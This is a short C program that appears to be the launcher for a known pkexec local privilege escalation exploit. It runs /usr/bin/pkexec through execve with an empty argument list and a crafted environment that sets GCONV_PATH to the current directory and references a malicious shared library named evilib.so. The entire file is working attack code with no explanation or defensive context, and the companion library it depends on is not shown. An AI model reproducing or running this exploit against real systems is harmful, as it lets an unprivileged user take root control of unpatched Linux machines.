#include<unistd.h>
int main(int argc,char **argv){
	char *const args[]={NULL};
	char *const environ[]={
		"evilib.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/are/you/kid/me",
		"CHARSET=HACK",
		NULL
	};
	execve("/usr/bin/pkexec",args,environ);
	return 0;
}

